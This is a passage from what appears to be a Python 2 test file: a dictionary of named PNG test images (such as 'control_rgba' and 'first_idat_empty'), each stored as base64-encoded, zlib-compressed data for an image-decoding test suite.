        'black_white': 'eJzrDPBz5+WS4mJgYOD19HAJAtJ/QZiRGUj6/n68H0gxFge5OzGsOyfzEshhSXf0dWRg2NjP/SeR\nFchnC/AJcQXS////X3pz/l0gi7PAI7KYgUFMFYQZPYNUPgCNuOfp4hiScW/ppY0r5QwFWi+GNyaX\nPw6L6fKaHbSMpZXrSMzxe7U/JP6dPSKn98I5/jn3fVGJRptzf5m8uVUvMP1e//j3tcAODRc5xXvX\ne8TkFOv2MTq5KH7i+MjrABRtEhds9figtEgApEREiUuwtQMoSxL3n/gUB+6cRuUCVjcFFu8FLFEJ\n3DKN2gZMihFMQPujH3DENApyHBTSaBS7weT+gKvHgWOaA+eWA2IWTOEJLE4bWLwWsG47ILiDSVmg\nSTWASXcDa98BoAcEdBqFMhp1C1jWHfhT8effX4aLh8yBNv9M74jX37C1gMXtuoxuSwInutX1POi6\nObCoorIDka14lkyMKrBD7Nj+vnR6xf9Lz93CtURaGxj9DJ6ufi7rnBKaAN4uxUs=\n'.decode("base64").decode("zlib"),
        'chunk_with_number_in_name_before_idat': 'eJztWFtQU0cYjjpq1YIVqnSoQkVipxbBtk6pYohArMSgMCATUiEUiW3VDgGJSUgImUrLRasMQSKK\nkorFS1WQIFAuIXVIJyIaL8hNSKKCJCjJKYHkkIST05OQMY0PbR988PZwzu6e3e/7v//ff3dnT37U\nlo0ucz3nolAoF3w4LhopIevz1nTkPUEcOo8U09KjN4aiKmWLh5HGnNRwUjoK5dpqfaZJqWcpyMdF\ntA1xtBjqNzRG0p4dqNSknSk0/5QdtA9W+68KUut3IiNQq0JCww5ehFQo1IKFeFzIViZZ0xN5toLB\nkY4uk+fd8smL+vHWnYMT1JjD/OivaqKS97qXkyS/nLxccTHhMiUaF1WU4++5waPWpfPw1nCP6hCP\n2s81PjuHD/M3BV7MoSwoz/Y5th6//ucoFqsoY3k6YGYAg7KJxiYgt/vhcdX1x7qsMuOJmibLaQxY\nGsgEJ/eDFfUsWD8LyMUOaBLZs8j6JVSw4NukRinPr5CSv5zgS9qO55doq32RWnmbG54fx0OfZvu1\nkXvd548k3hubP95xxLnHK63dYpxn/tBfxFlqCqMKMGsgX8Jqkk+bG0EooRWge5cdonPfMYEpa0Y7\nWnl+tyn5vgS/NrcODJ9S8EW8Ia3Yu3+Oci3rUbkz6oDrPlkZFisXyHh+n8iT8Ya8Nar4bDRpOyJ1\nZMHGdrK4O5jdbVj7DGNcmTqXK133kWkGnv+dEMdD8yn5w14E4Zk9ujmqZ0zEmLqMmnPcQQkXz0Mf\ns/o/Rf/vkXBzJsa9TFB5KZd9Uz4RAhwqbRYz68GrVSwPxWONcqIErJmfUQWdqlmFhJofLsQVoXl+\nCFMEiJA4hzjfKYjW2mYEIJmapTfQ5wvVnsG2qLKMdKBOOWqZCFNkA2y++WaiOVDbUA+j67l9GkWp\ngrPIPs02VkeG2FgdGWJldWSITZAjQ95Anx+0B5IItA3dcD6oiGSKudrpYK+SU2LO7Qu+gTFalPcN\ngBENmIiCn15A7a8xlN40G+zfrYWxWo9g817tDDCzsGnsbcMfSwCVBWqlPixr0CzstwzJSQhuZWyj\nHToce9S5SWrkMuG7WX0NmbRdNiE8dN3WSIVIJei1tJihz1SAvJKcZu+586TWfJXT582B1Vf6BsrA\n2cPYJvFSj6ovrZoRpSs73Q2h40eSYd3AGQJ2yjNJIb2qK+SJUgT01Hdg6ipYk66h2HvGK5zU/X8V\nTbkXX2nwjAClm4QS/uPqoNO67KAHowHUqsh4O217Jzn7YxqspqsbmtM7oIIkgr5nM0gE9tQSH/Tz\ndQ84j3IyFFRkf0LIh46nd7p2ZuqR8oIv4ftzZZeMZHatP5HtUlluzlbXw+8NMa7vRkbqyOHwHbIl\nb+whz6FisdZyX19XlCWdrLZtgsjqiK6wz0l17PnNYA9/RYJd1fhvEa96c4ReMFkAFnMfZWkPCFSK\nDNg71dtSw0gTGAf39isVDQNecBjA5QIR9mPBFsdfiTueJi6SZKIV9kPCkX/2OpIdVdfsp40twVix\njvWAJNv5T+1nj42aXPx0ddilvjHpZLJX02KJBbDBf0KDp8QyaFIJ+TDGlJPvgrfF99JAuAEMEOha\n2N1HS16LaLzYJoV9HDhZEROYoWTOYMi76f16eBDqIorYXrqW8ZmAGMC4v0zuvKom6U1QULN3s8xs\nubJyv0hXqtjmNZYyeYwhxbIFZjZQmCuT/JdGw9wUjukcVJHANOVksuKcJGLa5t2G1S3bEjOhIans\nhHi7yRkaF5BjuZuIzVBfKwITfqe9f8HJpZHqrmuJze5eIvOt4lbnnh8OSEtSGrEn7Ga6jqdvCZhy\nPFKYVYWBNcvg+5ecQsCeidxDm0PHZzsTtTdO3UP/OdKTgWWMnrTeQ+NehTn+/yZ3rbts5i4cWhI9\ncYMSYf1Zgt+wBVcZ+vW+vwE3MkEU\n'.decode("base64").decode("zlib"),
        'control': 'eJztV2tQE1cYzeioVYtWqNKhFSoSO7UItnVKFUMEYyUGhAGZQIVQJLZVO0QkJiEhZCotD21lCBJR\nhFQsWqsSCQINEFLHdCKi8YG8hCQqSIKSbAkkm9dmu4SMafxh+8MfvnZm996du+d85/vuuXvnFsVu\n3ugxx2cOCoXywEfi4pAWmrzfmIY8TcThM0iziLohkRpP+ZpKT9uzHbU7bUcGNShjO/X9VUErQzWG\nHSjUgoV4XPgWBknbG/NbDZ0tG1uqKLzhXxj7w41bP5so8Yd4cV/Wx6bv9apOkv5y/ELNuZQL5Dhc\nbGl+kM8G7waPrkNbIr3rwr0bPtP67xg5xNsUci6fvKA6z//oOvy6n2KZzNLsZVmAlQ4MyU3NLUBB\nz/1j6qsP9blV5sr6FvtJDFgRwgBt+8GaJiZsmAkUYAe1qayZJMNiClj8TVqzjBtYQi5aRghI2obn\nlevqApBedbsnnpfIRZ9kBbaT+rzmj6beGZ8/0XnYfcQ3s8Nunmv9IEjMXmJZT+FjVkMBhFVJ/u2e\nBKGUWozuW3qQxnnLAmasHuu8xA28SS4KIAS2e3ZieOTiz5ONmWV+A7NVa5gPqt1RB+btk1dhsQq+\nnBv4sSIdbyxcrU7OQydtQ6SOLtjYQZL0hLF6jGueYEys0hRwZGs/tEzH874V4rhoHrloxJcgPLVH\nP1v9RIh4S7dZe5ozJOXgueijk/lP0T+9Ep7uxLgXCaqo4LCuK0zhwMGKVgmjCbwsYHorH2pVpnKw\nfn62ADpRvxIpNS9SiCtFcwMRpigQIXEvcZFbESd70QhAOjVLr6HPFqo7hW1T55ppQKNqzG5ar8wD\nWDzr9VRriE7UBKObOP1aZYWSvcg5zQ5Wl0McrC6HTLK6HOIQ5HLIa+izg/ZCUr5O1AMXgcoYhoSj\nmwb2qdjl1oL+sGsYs1111wiY0YCFyP/xOdT+CkNpLbPAgV06GKvzDrPu1U0Hc0paxt80/rkYUNuh\nS5T7VSLtwgH7sCIJwa1IaHZCRxKOuL8mNXMY8O3cflEOdadDCBfduCVGKVbz++xtVuhTNaCoJWU6\nR249arBeZvf7sWHNxf7BKnDWCLZFssRb8MWkZkTpii4vY8TE4XRYP3iKgJ3KTFpCE3SHP1KJgd6m\nTkxjDdM2LwJ7x3yRvXv/36VT6SXXGn2iQNkmoZT3sC70pD4v9N5YMEUQk+yk7egi5X1EhTU0jag1\nqxMqTiMYeqNBIrCngXhvgKe/x36Qn62kIP8nhHz4WFbXvK4cA9KeDSB8d7rqvJnEaggisjxqq615\nmib4nWH61V3Il3pSJHyLZC8cv891qXhPZ79raCzNldnqHD9BZHXE1TjnpC7hTDTYy1ue4lQ18XvU\ny/46Siu2FYNlnAe5ugN8tTIb9tvtZ6+nZ/LNQ3sHVErRoC+8HuBwgCjntuCo46/E7Y+Ni5hMvNy5\nSbj85+wj7hBcce42DoMxE1zrATHbmU+ce4+DmlT2eHU4pb4O6RayT9tmTwCwYX9BQyckcsimgvzp\n4yrb2+BNyZ1MEBaBwXx9G6vnSPkrUY3nO6Swnw2nK+NDslWM6XRFD23AAA9B3UQxy1ffNjEDkAAY\nrxcpnZc1JK0FCm31a5Vb7RdX7BfrK5RbfcczbEfpMiyLb2UBJQVy6X9pNM7JYFtOQzUpDEt+DjPR\nTSKmfe5NWNO2NTUHGpbJKyXbLO7QxOB8++1UbLbmSimY8gf13bNuKY3WdV9JbfXyFVtvlF1yH/n+\ngKw8oxlb6QzTfSxrc/BU4jHCXAEG1i6F7553KwFrBnIObY2YmOVO1NE8dQ7995c+dCx97PjkOTTx\nZZjj/x9y59oLVs7C4cVxpmvkKBRy4TdsxtVGfLXvH+eaM74=\n'.decode("base64").decode("zlib"),
        'control_8bit': 'eJztVn1MU1cUvwtZpiSoGWFsdhUznQtTxChrJxAKRoQOULFq5hdFoxYmtn4UaERtFQ1+AI1WbRRK\nZ4LTWqTxsyjYoq3dHJl1wLo29VHbikxaPh6stpS2Zy0wA/NvcSaevHPOO+/9zrnn/u57N/fo8qUp\nIcFTgxFCIdTUxSv83hvQCUF+m2g78AihILQ8fWXyp/thTg7E74YkGmRmQToXtqRCPg2yc2EH2zL/\n5rchyk3EJoT+iESdaMJThBxTo3QImWgIklHnvjk69mrppK230J4f0RLxzm2nU5IaUWYTWq9D+ffQ\nF5crggQQKvahGw+QBJCiB9UB+VTrV0cB/VqKWm/NwSrXHbucKgG2/6qD9TZTdf4qmE2Fb3brC9Av\n22ZD0hRYjSAt1p79gScPYas2w2r2sQSojQEFBU79UHc7u/wwHc5SQbISh7CDgO7A9JrmSDBEAgS3\nOyMAwgC+1pkjwRIDfYki4FT+9t3PzWvhxVrgHyeKz6BjNeicHF3nodrzSFGDinXoAoZUpahFiDoO\nILiRqn6GLLZUHo8n9CtPJgvcqYVqe3EfKAHUQp5exjNUA34AXNWgBqVdLbQMVEJHJfgtKNVg0oNe\nDaAHuwn3WzABmNXgUoPd7lf/G5PLAmABHAKC3ss4iqG4FPe7T9jJ37NprK3swo27tqAdG3OZ7LnM\nLezpMXPnxf3lyEUoOIq6OGklJ6sLSxFsTgnj/X6vaEHj08Ph0w452ybye6fHn0zkTL5fL4GMwj8/\ny53lmi+/cuQO48TO/i7Fpb3Rwvz2TAIf45g0g+TuJ66/NQxSwk0cF0noH587NOs8NWfYMertbvrn\nk0roZ5dJfGkw8GyNh6s9YyP3HQ5gmg1zb/vcQlZ6x6GRUJ7ldGg3xC8UuW2MnkFzLz/0iljA1e31\ndHqbZwxVZd9Kq1XW4Uy1eIU3ZHLVoKBG2d9TohowcpcMjSnq2rgcpoxA/9tNhfvLV8EbAtT3HSlL\nYcUzrTMIEXqXR8MgJ1zFr77Gyzh0Mg6AONwtSmHG77eqCBGYy6IJJ7Vdw58TRRk5o3CiDEbomKwW\nw6jIv+ps0phRSO/Txyu9tmGzdRWBb+Dc13xETriBV5UVMhv2MTqFY2E/7aeOKbv9nQQsbfC1E6Ix\nTrvGRuo2cFo0RlLbTbz8tV8zTmfyyVXmkPCWqOHHe7p9KnMvof/DYZJ94vpJJZQnri4WNNn4qn9B\nz31crEi7j3t3IX2o0lV5na3wTJNU2aOlxK3jerRFfOPuRYLHM2OIRSzHvEuUApPzYgRRPrz3xb5s\n6zzvFmd5MjHCsou+u+H3Snq0D8WytjWeCxiHQqZPCTT3Ql8k7e+tYDXMipmYMVQr4J6SHGmvAr97\nkUdTzhwNeDQOgIL2MEK0kYNr+klVSvx0GSuvId+Kxb2FTsZjshaHzMBxaASkqjrcXtbB3JtvjSOY\njGf/B3vyGwCEyrg6zQJS1TX8WVl4XjzDuo1geuLqftQaPYqUx9XXM7wnH48iKtb4TgJEHO8CcpUC\nby27uH09xjFrjpMUip3O12a7YZeXWKIylzwXSJVWp3zD3ZeNxQMjH4xwLbeLb0pYRx80GsuNoVJK\nAX3QIS83CiTKl40PxK0ioodWQ4ntEvRInUH1NKn/RDOtlHLbXaH1Ruro3odmUwcLFo7Q3yRTHn2L\ndOzyYoUw+fgmb15OYpQ9cMSkJi9dXLso++A/TuW5Zg==\n'.decode("base64").decode("zlib"),
        'control_8bit_i': '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\nseY=\n'.decode("base64").decode("zlib"),
        'control_grayscale': 'eJzrDPBz5+WS4mJgYOD19HAJAtJ/QZgDSDAExekpMDAwzfV0cQypuPX27kZv6UCG44X/D5Rp8pZk\nLL+1cso0MZ2WrgtCGlNFNEWsI6w4lEpPBBzx/aTeYWHJIs5eqNFRcuKT1GK23X/YNOO+1O47LMjx\n8F1x+Z7yDxzmlzlLneOd7Z2yF94zjeat9Tx74bL5kvu6S3m0ruTP/SPz8H+P2WHHpb8efnu6nOur\n+LuHbqm/Ei1frwjaa11v9OptiNWr3vQ93jW+v+rPO639tbU5aNvrq+F/lnj7I4H67q+vF6r47I/m\nU41vn4cL/Ot7eVlust1aizr+Wm7dtluaVbjAr64vma3FmlNEXlqIO+kHfcEJglf5V/+R+SXxS2AW\n/17evZyqD1aL1L79tfRyUN3dHfvivV6aL30/taik8u30uvX3fmx9L1/2bLf6X7Yve/d2+xb/evfx\nVMZuoxchK+3Ly/l3+77qP6a/6vYq9/02bNNLy/cFrj8pmb+4U/I9T13psdW/MtE89i/s9WWvp7sv\nxGi8/VD5IjLDbMqXlxbPX7zEBZaH/LebIuLv7O/U79Tv/PLMhcu4wH3T2l9Ga2XsOO5y2/Is3ezm\njwvET7b7a22w1uIev2qtdkns39MCtn9NXpl7a+6N+jr79+a13wrX+9X+Tkjc8neLdfTSf3fu3quO\nnbmv1qbO827d3KryfylXotcUX7Ge/1Htx6sv4e9/S31dO7doV8D6fY/UY1Hj4/+S/9zBartNZ1Ut\nsAElWE9XP5d1TglNANUbgvk=\n'.decode("base64").decode("zlib"),
        'control_rgba': 'eJztmAtMU2cYhtmioCjUEDZ0CHUwBIYCG2rlYhuVi4zZ4mWhSAKiQZQppVBBSi9RxxAJbSIbEqRU\nUNYaOxrskEuBOjF0U2yDRRCVFkagXMullF7oZacNKqdNFpe4uCBN+p7k/Kff97zv/6U9PfnRyAg7\n289srays7CL3hR4Ejjrje5U1oFnbsVrg8CkuDI07hDmBy0pMT7JKSzyVivNNTcJt2ubrHzysOGVl\n5VgQGbr78Ln4iR4UM7U79l6/OzI0eoX3pWhHz4NxnpVebinWKdoA71qXkx2bvkxx8drsdqH0yMb1\nBfYs6+0OuUEntz6+d+T2xcPTlyt3dux4sPuS3Tc1dvtsj62clpd9AXu8S9qgLL85iaGKVwqPsjmb\n8zCGrnhJnVCWLRrB3YQ2KNEQorxGbKjlaxjdLmM83jia0b1xXG7QoZPJ2PpCUsn9Ld7tV+5v+coo\nnz98Ho74NrHY8URkYvF6o6xLOnMD+ot/lK28UT/YK4WpH7UxhOxa2aDjiXzjdasPdO3QJNpybvqz\nVS3y6/RAqjYpQ2hDPiVrkN/i5rL9o9YCa1GX7tztgBwq8cjNXlnJW6VFCKSTd2Vf58YeA07F7vmp\ndoHDx5dPyKv323GRmqjfbLF6zffjLtVsYaH+LqjvswGdwrvdoZJ1ZrbVCB5/vgSj3CvOwBjaa73a\nHVq3gBax1zxVgzGZWWv0F8xND/lkFh7X7bflPAD8cn7w+t5Z558be7CE3cZPLZNM+VF8JIqEcPNg\njPbAHoGPePxolNDYF8N5pnS9zTmKLfKLsujrYZHAW+zTe8LpcSaN44KeOJP70JAyzLYIDW0ypGtA\nks5KFsBK3Wkto/nHiep5iqI0Af7yf4a+jPPOcYLnrySE0Ciz+xEZrHmSFs2bucjHC5XwLCZZW83b\n1cloUSghZzWN8mtD+9gISQNkUQkTzGJHJhiQIxMMyJEJBuTIBANyZMoG5MiUDciRKRuQo2Wcd4Qj\ngCthKIY7cZDtOpZDGkEjzhoC8vDdKMJwNJkkYUNHb8EMUxVIia6Q3ygtsK9bCp6Xcf5xIgTijCCX\nkQKojreXqOPC05mT5OHmPPzU7zYQhcxGTGDycl6MQRTjRHoGUxQnAM8EIGHgNoBUsgI1EBoSRYcH\nyLpLY161cxyaCCEM9DghOpzaODDXocbgA69KBI5KXbOnRS3roSSSbA6lKZiiB9NkTyXwNa+jGlT3\n0ZuxeFVVAx+JKpdYs7cRFhgaHUaSx9xmqHRu68Kv2tB3TucROY3TU1XqPExZeXOSe33wq4s9BKud\ndeGGphdtxJoNIdn48YfaiQXwJ1uxyHrkrJRBoMzDNDFhxkqfOOtqTSstKUoeemubjazXk7jf1COn\niecLFNwu/iinSTKMeQ6dqY5ILE7Nz7h/m6J3UznZ2wipxKQsopEeI53x4XpC5a89V8X9VZYWqCkY\nu9rWG98T9mZTFmSkaifkt7dIGrShgJjNFyBm8wUIeL6MAp4vo4DnC5DL4Pl6/ziZmXMqcrm94jwv\nsDOmSam0V0xQ9bMV4rk4CZYpUdV2u46iXEOCO4sQOSyD7s+BDzepDwaHw6ESpnBMHlla0dLXisAx\n2WoRZmdnnF61BqKQk9MymRHkeTRZJzhO1E7wl2gIyzhvcJKT6apcUUU5SVQD1zTubZ6DCuzPChNc\nxyIQ51h54iyW0tBfo1f3L385LH0cDkdUR7NXJCTgWagyQ5GNpom8qysGgWXByoG/yvg+NkXBJWey\n+EJY6Y1/0aF7ugsFJ+LV54aKlOm9SRbrWXLClEH+x8ivfvG8/vx5FKx6Q4t5IkO0pnUqEQOBH32i\nPUQtK8/uCU8LtqyUzq1PeLYWTsDzq9SPLND8XobcyTg9W1e1KMZsT+AmJWDxbnAbeiHZMP3E6HPL\nCuwB4CZlbAV5t/n+yH+ul9UYnwWZbW3MqAsdP42lTmquLrFh+a9wTtNoeuhLr6C+608pt6yAV2QY\nMrR6z9ELfwP+3oCV\n'.decode("base64").decode("zlib"),
        'first_idat_empty': 'eJztWFtQU0cYjjpq1YIVqnSohorETi2CbW2pYohgrMSgMCATUiEUiW3VDgGJCSSETKXlZitDkIii\npGLxUpUICDRASB3SiYjGC3ITkqggCUpySoCc3E9PQsY0PrR98MHbwzm7e3a/7//+f//dnT0FUVs3\nuc31notAINxw4dhouLTYnjemw289YfgcXExLj94UhqiWLh6BG3NSw4npCIR7m+2ZJqGcIcMfF1E3\nxlFjKF9T6Ul7dyJSk3alUANSdlLfWx2wKlg1uQsegcBhQ7d9yp+FRCAWLLTVM0jq3sgzVXSWZGyZ\nLP+mb37UDzdv/6ynxBziRn9ZF5W8z7OSKP7lxKWqCwmXyNHYqJLcAO+NXvVuXYe2hXvVhHrVf6b2\n3TVyiLs56EIueUFlju/R9bj1P0UxGCWZy9MBEx0YkuqbmoG8ngfHlNceabMrDMfrmq2n0GB5UAZo\nLgSrGhnQ5CwgDzOoTmTOIk0uoYBF3yQ1STj+xeSC5Xg/4g4ct0xT4wfXKts9cNw4DuoU07+d1Oc5\nfzTx7vj8ic7Drj3ItA6rYZ7p/QAha6lxA4WHXmPxw68m+rZ74GvF1CJU37KDNPZbRjBlzVhnG8f/\nFrnAD+/f7tGJ5pKLPo/XpZX6DMxRrGU8rHRFHXDfL63AYGQ8Kcf/I1kyTpe/RhmfgyLugKWOLtjU\nQRL1hDB7dGufYoyrUOWxJes+MM7Acb+txXJQXHLBCBJfe3qvdo7yKRMxxm6D+ix7SMzGcVBHbf5P\n0f97JDxcibEvElRWzmbekOlDgYPlLaKMRvAKn+Elf6RW6MvAuvmZfMvJulVwqLnhtdgSFMcfZooA\nYRLXEBe4BNFW2wIDxFOz9Br6bKGa05hWZbaBBjQoxqz6DfIcgMk13Ug0BWkEjRCqkd2vlpfLWYsc\n02xndWaIndWZITZWZ4bYBTkz5DX02UF7LWKeRtADFYDyyAwRWzMd7FOwykx5/SHX0Qar4p4OMKAA\nI4H343Oo/RWG0ppngwN7NBBG4xVi2qeZAWYVN4+/qftjCaC0WtooDyoE6oUD1mEZEcatjG1yQEdi\nj7g2iU3sDOhOdr8gi7rbLoSDatgWKRcqeX3WVpPlEyUgqyalOXpuP643XWH1+7Ag1eX+wQpw9gim\nWbTUi/+FTTOsdGWXpy5s4nAypB08jcdMeSYupvG7Qx8rhEBvYye6oYphdg/D3DVcZqUW/lUy5V58\ntc47ApRsrhVzH9UEn9LmBN8fC6TwI+MdtB1dpJwPqZCKphK0pHdaipLwk71bQAKwt55wf4Crvc96\nmJspp8D7E0w+fCy9y70raxIuz/vhvztbcdFAYtYHEJhu1ZWmHFUj9M4w/doeeKSWFA7dJlnzxx9w\nnCoWa6z3JhtKsiXmGvsmCK+O6CrHnNTEntsC9nJXJDhUTfwW8bI3R2lF5iKwlP0wW3OAp5RnQj6p\nPtY6ehrPMLRvQCEXDCKhDQCbDUQ4jgV7HH8l7HySuHCSCVc4Dgln/jnqcHbwrzpOG3uCMWKd6wFO\ntnMfO84eOzWp9MnqcEh9bdLFZJ+61RoLYEL+tAydFEktZoXFlz6uML8N3hLdTQMhARjI07Yye46U\nvRLReL5N1vazoGR5TFCmImMGXdZDG5iEhizdBCETqW2dmAmIALTni+TOy2qS1mwJbvFpkZqsl1cW\nCrXl8u3I8RTzUboEw+SZmEBxnlT8Xxp1c1NYxrOWqoQMY24WI85FIrp93i1I1bo9McsyLJEeF+0w\nukLjAnOtdxIxmaqrJWDC79R3z7u4NFrTfTWxxRMpNN0sbXPt+f6ApCylCXPcYab7WPrWwCnHI2uz\n+WhIvQy6d9ElBMyZ8D20JWxititRR9PUPfSfI73pGPrYCds9NO5lmOP/b3L3uksm9sLhJdH66+QI\n+8+SjVux1WFf7f8bUjw/Kg==\n'.decode("base64").decode("zlib"),
        'gamma_four_and_srgb': 'eJztV31UUmccpu9V05au3HGly6SdNdO2debKkDRaEpoezYMsxZm4Vu2IJgGCyJbLj9ryiEmWJctm\nH6s0MXWoyDqyQ2ZRaX6lQKUJlnAnCldAuLsiJ0Z/bPujP/rinMt73/ve5/k9v9/7vPc9b17E1s1O\n89znIRAIJ2wIJhJuzZPXW9Ph/3H84AW4mZYWuTkYUSFdMgR3Zu4MCgtCzHb/vg2VNBPuz00JIaQh\nEM7Nk9c0CfkcCX64mLIphhJF/oZCS9ibhEhJ2JVM8U1Oonywxnd1gEq3C4FYuAiLCdpGJ6q7w8+V\n01iSkeWy3NteuRE/3m77eZwcdYQb+VV1ROI+1zKC+JdTV8ovxV0hRWIiCrN93Te51Th1HNkW4lYV\n5Fbzudpr19AR7hb/S9mkhWVZXsc3YDf8FMFgFKavSANMNGBAOl7fAOR0PTyhvPFYm1lqOFndYDmD\nAkv86eDEQbC8jgHpZgM56H51PHM2UbeUDObvTKiXcHwKSHkrcN6EHVhusabKG74ra3HBcmM4yDNM\nnxZij+uC4fh7owvG2o86jniktloM800f+gpZy4wbyTzUWrM3bg3Bq8UFxxdT8pE9yw9T2e8YweS1\nI+3NHJ87pDxvnE+LSzuKS8r/IlafWuTZN1exjvGozBF1yHm/tBSNlvGkHJ9PZIlYfe5aZWwWkrAD\nljq8cHMrUdQVyOzSr3uGMaZUlcOWrP/IOAPL/ZaP4SC5pLwhDxz/7F7tXOUzIaKMnQb1efaAmI3l\nII9P5j9F/++VcHEkxrxMUFkJm3lLNh4EHC5pFNHrwGuVDDf5Y7VivBisXpBeaT5dvRouNTeEjylE\ncnxgplAQJnEscZ5DESfvwmCAeGqW3kCfL1RzFt2kzDRQgVrFiGV8ozwLYHJNt+JN/hpBHYSsY/eq\n5SVy1mLbNFtZ7Q6xstodMslqd4hVkN0hb6DPD9ptFvM0gi4oD5SH00VszXSwR8EqNuX0Bt5EGSyK\n+3rAgASMeN6BF1D7awylNswB+/ZoILTGLdC0TzMDzChoGH1b/8dSQGkxN5MflgrUi/osgzICjFsV\nXW+DDkUfc+wS6tl06G5mryCDstsqhIOs3RYuFyp5PZYmk/kzJSCrIKbaRtqe1JiusXo9WZDqam9/\nKThnCN0gWuZW+eWkZljpqg5XffDY0URI238Wh57KTFxArewMeqIQAt117ajacsaEczD6nuEqK+Xg\nX4VT6cVW6N1DQckWvpj7uCrgjDYr4MGIH7kyPNZG29pBzPqYAqmoKkFjWrs5PwGn6w4D8cDeGvyD\nPq72AetRdrqcDH+fYPLBE2kdzh0ZOri96I377nzpZQORWeOLZzpVlJmyVHXQe4O0G3vgN7XEEKiN\naMkdfcixq1iisdzX1RZmSiaqrB9BeHVEltvmpCr6QhjYzV0ZZ1M19lvoq94dpuZP5INF7EeZmkM8\npTwd8kzxtFTTUnmGgX19Crmg3wPaCLDZQKhtW7DW8Vd80lPjwiYTrrRtEnb/2e5hd1Ret+02VoMx\nou3rATbbhU9te4+Vmlj0dHXYpL4J6RCyR91kiQbQgX+aB06LpOYJhdmLNqqYeBe8I7qXCkIC0I+